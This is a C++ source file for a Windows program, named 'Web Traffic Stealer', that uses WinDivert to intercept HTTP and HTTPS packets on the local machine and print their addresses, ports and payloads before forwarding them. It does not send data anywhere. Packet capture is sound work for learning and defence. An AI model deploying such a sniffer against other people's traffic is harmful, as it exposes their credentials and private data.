#include <windows.h>
#include <iostream>
#include <iomanip>
#include <string>
#include <vector>
#include "WinDivert/include/windivert.h"

#pragma comment(lib, "WinDivert/x64/WinDivert.lib")

class WebStealer {
private:
    HANDLE handle;
    bool running;
    static const int MAXBUF = 0xFFFF;

    void printPacketContents(const char* data, int length) {
        std::cout << "\nPacket Contents:" << std::endl;
        
        // Print as ASCII
        std::cout << "ASCII:" << std::endl;
        for (int i = 0; i < length; i++) {
            char c = data[i];
            if (isprint(c)) {
                std::cout << c;
            } else {
                std::cout << '.';
            }
            if ((i + 1) % 80 == 0) std::cout << std::endl;
        }
        std::cout << std::endl;

        // Print as hex
        std::cout << "\nHex dump:" << std::endl;
        for (int i = 0; i < length; i++) {
            if (i % 16 == 0) std::cout << "  ";
            std::cout << std::hex << std::setw(2) << std::setfill('0') 
                      << (int)(unsigned char)data[i] << " ";
            if ((i + 1) % 16 == 0) std::cout << std::endl;
        }
        std::cout << std::dec << std::endl;
    }

public:
    WebStealer() : handle(INVALID_HANDLE_VALUE), running(false) {}

    bool start() {
        // Open WinDivert handle to capture web traffic
        handle = WinDivertOpen(
            "tcp.DstPort == 80 or tcp.DstPort == 443 or tcp.SrcPort == 80 or tcp.SrcPort == 443",
            WINDIVERT_LAYER_NETWORK, 0, 0);

        if (handle == INVALID_HANDLE_VALUE) {
            std::cerr << "Failed to open WinDivert handle. Error: " << GetLastError() << std::endl;
            std::cerr << "Make sure you're running as Administrator!" << std::endl;
            return false;
        }

        running = true;
        std::cout << "Started packet interception..." << std::endl;
        std::cout << "Capturing HTTP/HTTPS traffic. Try browsing some websites!" << std::endl;

        // Packet capture loop
        std::vector<char> packet(MAXBUF);
        WINDIVERT_ADDRESS addr;
        UINT packetLen;

        while (running) {
            if (WinDivertRecv(handle, packet.data(), MAXBUF, &addr, &packetLen)) {
                // Get IP header
                PWINDIVERT_IPHDR ipHdr = (PWINDIVERT_IPHDR)packet.data();
                PWINDIVERT_TCPHDR tcpHdr = (PWINDIVERT_TCPHDR)(packet.data() + (ipHdr->HdrLength * 4));

                // Convert IPs to strings
                char srcIP[16], dstIP[16];
                UINT32 saddr = ntohl(ipHdr->SrcAddr);
                UINT32 daddr = ntohl(ipHdr->DstAddr);
                sprintf_s(srcIP, "%d.%d.%d.%d", 
                    (saddr >> 24) & 0xFF, (saddr >> 16) & 0xFF,
                    (saddr >> 8) & 0xFF, saddr & 0xFF);
                sprintf_s(dstIP, "%d.%d.%d.%d",
                    (daddr >> 24) & 0xFF, (daddr >> 16) & 0xFF,
                    (daddr >> 8) & 0xFF, daddr & 0xFF);

                // Get ports
                UINT16 srcPort = ntohs(tcpHdr->SrcPort);
                UINT16 dstPort = ntohs(tcpHdr->DstPort);

                std::cout << "\n=== Intercepted Web Traffic ===" << std::endl;
                std::cout << "From: " << srcIP << ":" << srcPort << std::endl;
                std::cout << "To: " << dstIP << ":" << dstPort << std::endl;
                std::cout << "Size: " << packetLen << " bytes" << std::endl;

                // Calculate payload offset and length
                int headerLen = (ipHdr->HdrLength * 4) + (tcpHdr->HdrLength * 4);
                int payloadLen = packetLen - headerLen;

                if (payloadLen > 0) {
                    printPacketContents(packet.data() + headerLen, payloadLen);
                }

                std::cout << "=============================" << std::endl;

                // Forward the packet
                WinDivertSend(handle, packet.data(), packetLen, &addr, NULL);
            }
        }

        return true;
    }

    void stop() {
        running = false;
        if (handle != INVALID_HANDLE_VALUE) {
            WinDivertClose(handle);
            handle = INVALID_HANDLE_VALUE;
        }
    }

    ~WebStealer() {
        stop();
    }
};

int main() {
    std::cout << "Starting Web Traffic Stealer..." << std::endl;
    std::cout << "WARNING: This program requires administrator privileges!" << std::endl;
    std::cout << "WARNING: Only use this for educational purposes!" << std::endl;
    
    WebStealer stealer;
    if (!stealer.start()) {
        std::cerr << "Failed to start web traffic stealer" << std::endl;
        return 1;
    }
    return 0;
}
